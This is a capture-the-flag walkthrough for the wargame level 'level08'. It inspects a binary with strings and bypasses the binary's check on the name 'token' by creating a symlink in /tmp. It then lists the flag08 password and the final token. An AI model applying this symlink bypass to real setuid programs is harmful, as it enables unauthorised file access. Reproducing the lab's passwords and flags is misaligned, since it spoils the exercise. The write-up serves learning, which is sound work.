# level08

1. Files found in `~/` :

```bash
level08  token
```

Binary file `level08` (which requires a parameter) as well as a `token` file at the root, so we tried to give the token file to the executable :

```bash
./level08 token
You may not access token
```

2. Binary analysis

```bash
strings level08
```

Several lines catch our attention :

```bash
__stack_chk_fail
printf
strstr
read
open

%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```

We can deduce that there is a check fail, `__stack_chk_fail`, and that there is a good chance that the check is done by comparing two strings with `strstr`. We can then see that two strings exist in the logs so `%s` and `token`. We therefore deduce that the file passed as parameter must not be named `token`.

3. Exploitation

We have no rights on `token`, so impossible to rename or copy. We therefore decided to create a shortcut to `token` named `lecteur` in /tmp/ :

```bash
ln -s /home/user/level08/token /tmp/lecteur
./level08 /tmp/lecteur
```

Launch `./level08` with `/tmp/lecteur` as parameter, the compared string will then not be `token`.

4. Final exploitation

```bash
su flag08
quif5eloekouj29ke0vouxean
getflag
```

5. Token discovered

The token is : `25749xKZ8L7DkSCwJkT9dyv6f`
